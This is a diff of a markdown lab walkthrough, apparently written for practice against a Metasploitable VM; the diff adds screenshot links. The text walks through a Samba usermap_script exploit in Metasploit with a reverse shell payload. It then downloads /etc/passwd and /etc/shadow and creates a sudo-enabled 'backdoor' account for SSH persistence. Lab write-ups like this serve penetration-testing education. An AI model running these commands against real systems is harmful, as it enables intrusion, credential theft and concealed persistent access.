@@ -23,18 +23,21 @@ To discover the target, metasploitable , and its vulnerabilities
 login into metasploit using username and password as msfadmin, type **ifconfig** and check inet t see the ip, do the same for kali.
 In this case the host IP, kali is 192.168.56.102 and for metasploitable, Remote host 192.168.56.101
 perform a port scna using nmap -Pn -sV -A -O 192.168.56.101. The scan reveals an old version of samba on port 445 which is vulnerable to  the Usermap_script exploit
-
+![Topography Image](/assets/images/recon.png)
 
 #### 3. Exploiting using metasploit
 launch metasploit **msfconsole -q**
 **search samba** to see possible exploits, in this case we will exploit using **search usermap_script** and so we will use **use exploit/multi/samba/usermap_script** exploit. Run that in msf
 run **show options** to see what need to be set ie RHOST and LHOST
+![Topography Image](/assets/images/msf.png)
 
 Configure the required exploit parameters
 **set RHOSTS 192.168.56.101   # (Remote Host) The target IP**
 **set LHOST 192.168.56.102    # (Local Host) Your Kali IP**
 Set a reliable payload, the default payload can be unstable. use a more robust one ie **set PAYLOAD cmd/unix/reverse_openssl**
+![Topography Image](/assets/images/set.png)
 Exploit
+![Topography Image](/assets/images/exploit.png)
 Handle the Session: The exploit will run and open a command shell session. It may seem to hang
 Press Ctrl+Z to background the session
 Type y to confirm
@@ -44,7 +47,7 @@ You are now back at the msf6 prompt. Your session is active in the background.
 We want to make sure to Explore the compromised system, loot data, and ensure you can get back in.
  To list all active sessions, we **sessions -l** after the ctrl+z above. Note the Id
  Then do a session interact **sessions -i 1** and we are in
-
+![Topography Image](/assets/images/inside.png)
  You can try things like whoami, id
  # What is the operating system?
 cat /etc/issue
@@ -72,6 +75,7 @@ ls -la /var/www
 Download Sensitive Files: Background the session (Ctrl+Z -> y) and use Metasploit's download command from the msf6 prompt.
 download /etc/passwd /home/[YourKaliUser]/passwd.txt
 download /etc/shadow /home/[YourKaliUser]/shadow.txt
+![Topography Image](/assets/images/download.png)
 
 #### Persistence
 We are determined to Create a reliable, long-term access method that doesn't depend on the initial exploit.
@@ -81,8 +85,10 @@ To do tis,
 useradd -m -s /bin/bash backdoor  # Creates user 'backdoor1' with a home directory
 passwd backdoor                   # Set the password for the new user (e.g., 'backdoor')
 usermod -aG sudo backdoor         # Adds the user to the sudo group (root privileges)
+![Topography Image](/assets/images/backdoor.png)
 
 And the backdoor will be successfully created. Now in a new kali terminal, try to access it by **ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.101** and put the pasword
+![Topography Image](/assets/images/ssh.png)
  
 
 
